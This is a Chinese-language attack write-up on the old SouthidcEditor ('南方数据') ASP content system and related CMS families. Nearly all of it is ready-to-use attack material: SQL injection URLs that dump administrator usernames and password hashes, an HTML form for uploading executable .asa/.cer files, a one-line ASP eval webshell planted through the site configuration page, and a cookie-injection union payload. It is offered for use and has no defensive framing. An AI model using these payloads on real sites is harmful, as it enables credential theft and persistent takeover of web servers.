# 南方数据编辑器southidceditor注入漏洞

漏洞影响版本较老

 1.[注入](http://www.webshell.cc/tag/zhuru)点:`news_search.asp?key=7%' union select 0,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9 from  admin where 1 or '%'='&otype=title&Submit=%CB%D1%CB%F7`
 直接暴管理员帐号密码(md5)

 2.登陆后台

 3.利用编辑器[上传](http://www.webshell.cc/tag/shangchuan):

 访问admin/southidceditor/admin_style.asp

 修改编辑器样式,增加asa(不要asp).然后直接后台编辑新闻上传.

 ========================================

 参考资料整理:

 1、通过upfile_other.asp漏洞文件直接取SHELL

 直接打开userreg.asp进行注册会员，进行登录，（在未退出登录的状态下）使用本地上传文件进行上传代码如下：

```
 <HTML><HEAD> <META http-equiv=Content-Type content="text/html; charset=gb2312"> <STYLE type=text/css>BODY { FONT-SIZE: 9pt; BACKGROUND-COLOR: #e1f4ee } .tx1 { BORDER-RIGHT: #000000 1px solid; BORDER-TOP: #000000 1px solid;  FONT-SIZE: 9pt; BORDER-LEFT: #000000 1px solid; COLOR: #0000ff;  BORDER-BOTTOM: #000000 1px solid; HEIGHT: 20px } </STYLE>

 <META content="MSHTML 6.00.2800.1400" name=GENERATOR></HEAD> <BODY leftMargin=0 topMargin=0> <FORM name=form1 action="http://www.webshell.cc/upfile_Other.asp"; method=post encType=multipart/form-data><INPUT type=file size=30  name=FileName> <INPUT type=file size=30 name=FileName1>  <INPUT xxxxx="BORDER-RIGHT: rgb(88,88,88) 1px double; BORDER-TOP:  rgb(88,88,88) 1px double; FONT-WEIGHT: normal; FONT-SIZE: 9pt;  BORDER-LEFT: rgb(88,88,88) 1px double; LINE-HEIGHT: normal;  BORDER-BOTTOM: rgb(88,88,88) 1px double; FONT-STYLE: normal;  FONT-VARIANT: normal" type=submit value=上传 name=Submit> <INPUT id=PhotoUrlID type=hidden value=0 name=PhotoUrlID> </FORM></BODY></HTML>
```

 将以上代码保存为html格式，替换代码中的网址，第一个框里选择图片文件，第二个框选择.cer、.asa或asp文件上传（后面需要加一个空格，貌似在IE8中进行使用不能后面加空格，加空格时就弹出选择文件对话框，我是找不到解决办法）。

 注：此方法通杀南方数据、良精系统、网软天下等

 2、通过注入秒杀管理员帐号密码，使用如下：

 `http://******/NewsType.asp?SmallClass=’%20union%20select%200,username%2BCHR(124)%2Bpassword,2,3,4,5,6,7,8,9%20from%20admin%20union%20select%20*%20from%20news%20where%201=2%20and%20’’=’`

 以上代码直接暴管理员帐号和密码，取SHELL方法如下：

 在网站配置[http://\*****\*/admin/SiteConfig.asp]的版权信息里写入`"%><%eval(request(chr(35)))%><%’`
 成功把shell写入http://\*****\*/inc/config.asp

 这里一句话chr(32)密码是“#”

 3、cookie注入

 清空地址栏，利用union语句来注入，提交：

 `javascript:alert(document.cookie="id="+escape("1 and 1=2 union select 1,username,password,4,5,6,7,8,9,10 from Admin"))`